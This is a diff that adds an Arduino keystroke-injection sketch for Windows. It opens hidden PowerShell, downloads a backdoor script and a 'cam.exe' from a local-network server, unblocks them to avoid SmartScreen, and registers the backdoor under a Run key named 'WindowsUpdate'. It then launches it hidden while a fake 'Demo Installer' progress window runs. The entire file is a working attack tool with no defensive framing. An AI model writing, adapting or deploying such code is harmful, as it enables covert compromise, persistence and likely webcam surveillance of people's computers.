@@ -1,0 +1,100 @@
+#include <Keyboard.h>
+
+void setup() {
+  delay(3000); // Time to insert after upload
+
+  // --- 1. Open Run and launch PowerShell hidden (for initial setup) ---
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.print("powershell -WindowStyle Hidden");
+  Keyboard.write(KEY_RETURN);
+  delay(2000);
+
+  // --- 2. Download the backdoor script (will be used later) ---
+  Keyboard.print("Invoke-WebRequest -Uri 'http://192.168.1.53:8000/backdoor.ps1' -OutFile \"C:\\Users\\Public\\backdoor.ps1\"");
+  Keyboard.write(KEY_RETURN);
+  delay(3000);
+
+  // --- 3. Download optional cam.exe (if available) ---
+  Keyboard.print("Invoke-WebRequest -Uri 'http://192.168.1.53:8000/cam.exe' -OutFile \"$env:TEMP\\cam.exe\"");
+  Keyboard.write(KEY_RETURN);
+  delay(3000);
+
+  // --- 4. Create the installer script (with progress GUI) ---
+  // The script is stored as a multi‑line string and saved to C:\Users\Public\installer.ps1
+  Keyboard.print("$installer = @'\n");
+  delay(100);
+  // ----- Begin installer script content -----
+  Keyboard.print("Add-Type -AssemblyName System.Windows.Forms\n");
+  Keyboard.print("Add-Type -AssemblyName System.Drawing\n");
+  Keyboard.print("$form = New-Object System.Windows.Forms.Form\n");
+  Keyboard.print("$form.Text = 'Demo Installer'\n");
+  Keyboard.print("$form.Size = New-Object System.Drawing.Size(450,150)\n");
+  Keyboard.print("$form.StartPosition = 'CenterScreen'\n");
+  Keyboard.print("$form.TopMost = $true\n");
+  Keyboard.print("$label = New-Object System.Windows.Forms.Label\n");
+  Keyboard.print("$label.Location = New-Object System.Drawing.Point(20,10)\n");
+  Keyboard.print("$label.Size = New-Object System.Drawing.Size(400,20)\n");
+  Keyboard.print("$label.Text = 'Starting installation...'\n");
+  Keyboard.print("$label.Font = New-Object System.Drawing.Font('Segoe UI',10,[System.Drawing.FontStyle]::Bold)\n");
+  Keyboard.print("$form.Controls.Add($label)\n");
+  Keyboard.print("$progress = New-Object System.Windows.Forms.ProgressBar\n");
+  Keyboard.print("$progress.Location = New-Object System.Drawing.Point(20,50)\n");
+  Keyboard.print("$progress.Size = New-Object System.Drawing.Size(400,30)\n");
+  Keyboard.print("$progress.Minimum = 0\n");
+  Keyboard.print("$progress.Maximum = 100\n");
+  Keyboard.print("$form.Controls.Add($progress)\n");
+  Keyboard.print("$form.Show()\n");
+  Keyboard.print("$form.Refresh()\n");
+  Keyboard.print("function Update-Progress {\n");
+  Keyboard.print("  param([int]$Percent, [string]$Message)\n");
+  Keyboard.print("  $progress.Value = $Percent\n");
+  Keyboard.print("  $label.Text = $Message\n");
+  Keyboard.print("  $form.Refresh()\n");
+  Keyboard.print("  Start-Sleep -Milliseconds 200\n");
+  Keyboard.print("}\n");
+  Keyboard.print("Update-Progress 0 'Step 1/5: Downloading tools...'\n");
+  Keyboard.print("# Tools already downloaded by Arduino, but we wait a moment\n");
+  Keyboard.print("Start-Sleep -Seconds 1\n");
+  Keyboard.print("Update-Progress 20 'Step 2/5: Unblocking files...'\n");
+  Keyboard.print("Unblock-File -Path '$env:TEMP\\cam.exe' -ErrorAction SilentlyContinue\n");
+  Keyboard.print("Unblock-File -Path 'C:\\Users\\Public\\backdoor.ps1' -ErrorAction SilentlyContinue\n");
+  Keyboard.print("Update-Progress 40 'Step 3/5: Adding persistence...'\n");
+  Keyboard.print("$regPath = 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'\n");
+  Keyboard.print("$regValue = 'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Users\\Public\\backdoor.ps1'\n");
+  Keyboard.print("New-ItemProperty -Path $regPath -Name 'WindowsUpdate' -Value $regValue -PropertyType String -Force | Out-Null\n");
+  Keyboard.print("Update-Progress 60 'Step 4/5: Starting backdoor...'\n");
+  Keyboard.print("Start-Process -FilePath 'powershell' -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Users\\Public\\backdoor.ps1' -WindowStyle Hidden\n");
+  Keyboard.print("Update-Progress 80 'Step 5/5: Finalizing...'\n");
+  Keyboard.print("Start-Sleep -Seconds 2\n");
+  Keyboard.print("Update-Progress 100 'Installation complete! You may unplug the Arduino.'\n");
+  Keyboard.print("Start-Sleep -Seconds 3\n");
+  Keyboard.print("$form.Close()\n");
+  // ----- End installer script content -----
+  Keyboard.print("'@ | Out-File -FilePath C:\\Users\\Public\\installer.ps1 -Encoding ascii");
+  Keyboard.write(KEY_RETURN);
+  delay(1000);
+
+  // --- 5. Unblock the installer script (to avoid SmartScreen) ---
+  Keyboard.print("Unblock-File -Path C:\\Users\\Public\\installer.ps1");
+  Keyboard.write(KEY_RETURN);
+  delay(500);
+
+  // --- 6. Run the installer script (this will show the progress window) ---
+  Keyboard.print("powershell -ExecutionPolicy Bypass -File C:\\Users\\Public\\installer.ps1");
+  Keyboard.write(KEY_RETURN);
+  delay(500); // Give it a moment to start
+
+  // --- 7. Close the initial PowerShell window (the one we used to type commands) ---
+  delay(1000);
+  Keyboard.write(KEY_LEFT_ALT);
+  Keyboard.print(" ");
+  delay(100);
+  Keyboard.press('n');
+  Keyboard.releaseAll();
+}
+
+void loop() {}
